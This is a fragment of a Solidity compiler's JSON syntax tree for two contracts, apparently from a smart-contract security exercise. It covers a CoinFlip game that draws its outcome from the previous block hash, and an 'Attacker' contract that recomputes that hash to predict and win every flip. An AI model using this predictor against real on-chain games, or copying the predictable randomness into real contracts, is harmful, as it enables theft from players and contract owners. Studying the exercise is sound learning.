															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 55,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 48,
															"src": "606:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "618:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "606:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 59,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "629:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 60,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "606:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 58,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "622:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "594:40:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 64,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 62,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "651:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 63,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 18,
														"src": "659:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "651:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 77,
													"nodeType": "Block",
													"src": "743:73:0",
													"statements": [
														{
															"expression": {
																"id": 73,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "758:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"hexValue": "30",
																	"id": 72,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "776:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "758:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 74,
															"nodeType": "ExpressionStatement",
															"src": "758:19:0"
														},
														{
															"expression": {
																"hexValue": "66616c7365",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "799:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 22,
															"id": 76,
															"nodeType": "Return",
															"src": "792:12:0"
														}
													]
												},
												"id": 78,
												"nodeType": "IfStatement",
												"src": "647:169:0",
												"trueBody": {
													"id": 70,
													"nodeType": "Block",
													"src": "667:70:0",
													"statements": [
														{
															"expression": {
																"id": 66,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "682:17:0",
																"subExpression": {
																	"id": 65,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "682:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 67,
															"nodeType": "ExpressionStatement",
															"src": "682:17:0"
														},
														{
															"expression": {
																"hexValue": "74727565",
																"id": 68,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "721:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 22,
															"id": 69,
															"nodeType": "Return",
															"src": "714:11:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "1d263f67",
									"id": 80,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "_guess",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "322:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 17,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "322:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "321:13:0"
									},
									"returnParameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 21,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "351:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 20,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "351:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "350:6:0"
									},
									"scope": 81,
									"src": "308:515:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 152,
							"src": "60:766:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 151,
							"linearizedBaseContracts": [
								151
							],
							"name": "Attacker",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 84,
									"mutability": "mutable",
									"name": "coinflip",
									"nodeType": "VariableDeclaration",
									"scope": 151,
									"src": "856:17:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_CoinFlip_$81",
										"typeString": "contract CoinFlip"
									},
									"typeName": {
										"id": 83,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 82,
											"name": "CoinFlip",
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 81,
											"src": "856:8:0"
										},
										"referencedDeclaration": 81,
										"src": "856:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_CoinFlip_$81",
											"typeString": "contract CoinFlip"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 86,
									"mutability": "mutable",
									"name": "lastHash",
									"nodeType": "VariableDeclaration",
									"scope": 151,
									"src": "882:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 85,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "882:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 89,
									"mutability": "mutable",
									"name": "FACTOR",
									"nodeType": "VariableDeclaration",
									"scope": 151,
									"src": "905:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 87,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "905:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 88,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "922:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 100,
										"nodeType": "Block",
										"src": "1038:52:0",
										"statements": [
											{
												"expression": {
													"id": 98,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 94,
														"name": "coinflip",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 84,
														"src": "1049:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$81",
															"typeString": "contract CoinFlip"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 96,
																"name": "_address",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 91,
																"src": "1069:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 95,
															"name": "CoinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 81,
															"src": "1060:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_CoinFlip_$81_$",
																"typeString": "type(contract CoinFlip)"
															}
														},
														"id": 97,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1060:18:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$81",
															"typeString": "contract CoinFlip"
														}
													},
													"src": "1049:29:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$81",
														"typeString": "contract CoinFlip"
													}
												},
												"id": 99,
												"nodeType": "ExpressionStatement",
												"src": "1049:29:0"
											}
										]
									},
									"id": 101,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 92,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 91,
												"mutability": "mutable",
												"name": "_address",
												"nodeType": "VariableDeclaration",
												"scope": 101,
												"src": "1020:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 90,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1020:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1019:18:0"
									},
									"returnParameters": {
										"id": 93,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1038:0:0"
									},
									"scope": 151,
									"src": "1008:82:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 149,
										"nodeType": "Block",
										"src": "1125:315:0",
										"statements": [
											{
												"assignments": [
													105
												],
												"declarations": [
													{
														"constant": false,
														"id": 105,
														"mutability": "mutable",
														"name": "blockValue",
														"nodeType": "VariableDeclaration",
														"scope": 149,
														"src": "1136:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 104,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1136:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 115,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 112,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 109,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "1175:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 110,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "1175:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 111,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1190:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "1175:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 108,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "1165:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 113,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1165:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 107,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "1157:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 106,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1157:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1157:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1136:57:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 118,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 116,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 86,
														"src": "1209:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 117,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 105,
														"src": "1221:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1209:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 123,
												"nodeType": "IfStatement",
												"src": "1206:61:0",
												"trueBody": {
													"id": 122,
													"nodeType": "Block",
													"src": "1232:35:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 119,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "1247:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 120,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1247:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 121,
															"nodeType": "ExpressionStatement",
															"src": "1247:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 126,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 124,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 86,
														"src": "1279:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 125,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 105,
														"src": "1290:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1279:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 127,
												"nodeType": "ExpressionStatement",
												"src": "1279:21:0"
											},
											{
												"assignments": [
													129
												],
												"declarations": [
													{
														"constant": false,
														"id": 129,
														"mutability": "mutable",
														"name": "coinFlip",
														"nodeType": "VariableDeclaration",
														"scope": 149,
														"src": "1311:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 128,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1311:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 133,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 132,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 130,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 105,
														"src": "1330:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 131,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 89,
														"src": "1343:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1330:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1311:38:0"
											},
											{
												"assignments": [
													135
												],
												"declarations": [
													{
														"constant": false,
														"id": 135,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"scope": 149,
														"src": "1360:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 134,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1360:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 142,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 138,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 136,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 129,
															"src": "1372:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 137,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1384:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "1372:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 140,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1395:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 141,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "1372:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 139,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1388:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1360:40:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 146,
															"name": "side",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 135,
															"src": "1427:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"expression": {
															"id": 143,
															"name": "coinflip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 84,
															"src": "1413:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$81",
																"typeString": "contract CoinFlip"
															}
														},
														"id": 145,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "flip",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 80,
														"src": "1413:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
															"typeString": "function (bool) external returns (bool)"
														}
													},
													"id": 147,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1413:19:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 148,
												"nodeType": "ExpressionStatement",
												"src": "1413:19:0"
											}
										]
									},
									"functionSelector": "cde4efa9",
									"id": 150,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 102,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1115:2:0"
									},
									"returnParameters": {
										"id": 103,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1125:0:0"
									},
									"scope": 151,
									"src": "1102:338:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 152,
							"src": "830:613:0"
						}
					],
					"src": "33:1412:0"
				},
				"id": 0
			}
		}
	}
}